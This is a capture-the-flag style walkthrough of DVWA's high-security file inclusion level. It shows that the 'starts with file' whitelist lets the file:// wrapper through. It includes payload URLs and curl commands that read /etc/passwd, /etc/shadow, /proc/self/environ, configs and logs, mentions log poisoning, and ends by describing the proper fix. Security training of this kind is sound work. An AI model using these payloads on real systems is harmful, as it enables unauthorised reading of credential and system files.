# DVWA File Inclusion — High Security

## URL
http://127.0.0.1:4280/vulnerabilities/fi/?page=include.php

## Source Code Behavior (High)
- Input must start with "file" (to allow `file://` protocol and local `file*.php` pages)
- Uses `fnmatch()` or prefix check: page must begin with "file" or be "include.php"
- Blocks remote protocols and arbitrary paths

## Key Differences from Medium
1. Whitelist approach — page must start with "file"
2. Blocks most LFI paths (can't start with `/` or `../`)
3. BUT `file://` protocol is allowed since it starts with "file"

## Bypass Techniques

### file:// protocol wrapper
```
http://127.0.0.1:4280/vulnerabilities/fi/?page=file:///etc/passwd
```
`file:///etc/passwd` starts with "file" — passes the check!

### Read DVWA config
```
http://127.0.0.1:4280/vulnerabilities/fi/?page=file:///var/www/html/dvwa/config/config.inc.php
```

### Read other system files
```
http://127.0.0.1:4280/vulnerabilities/fi/?page=file:///etc/shadow
http://127.0.0.1:4280/vulnerabilities/fi/?page=file:///proc/self/environ
http://127.0.0.1:4280/vulnerabilities/fi/?page=file:///var/log/apache2/access.log
```

## Step-by-Step Exploitation
1. Try `?page=/etc/passwd` — fails (doesn't start with "file")
2. Try `?page=file:///etc/passwd` — works! Starts with "file"
3. Try `?page=file:///var/www/html/dvwa/config/config.inc.php` — PHP file included and executed
4. For PHP source reading, may need to chain with log poisoning if php:// is blocked

## curl Commands
```bash
# file:// protocol bypass
curl -v "http://127.0.0.1:4280/vulnerabilities/fi/?page=file:///etc/passwd" \
  -b "PHPSESSID=<session>;security=high"

# Read Apache logs (for potential log poisoning)
curl -v "http://127.0.0.1:4280/vulnerabilities/fi/?page=file:///var/log/apache2/access.log" \
  -b "PHPSESSID=<session>;security=high"
```

## Notes
- The "file" prefix check inadvertently allows the `file://` wrapper
- `file://` provides direct filesystem access — as powerful as absolute paths
- Demonstrates that whitelisting must be precise — "starts with file" is too broad
- Proper fix: whitelist specific allowed filenames, not prefixes
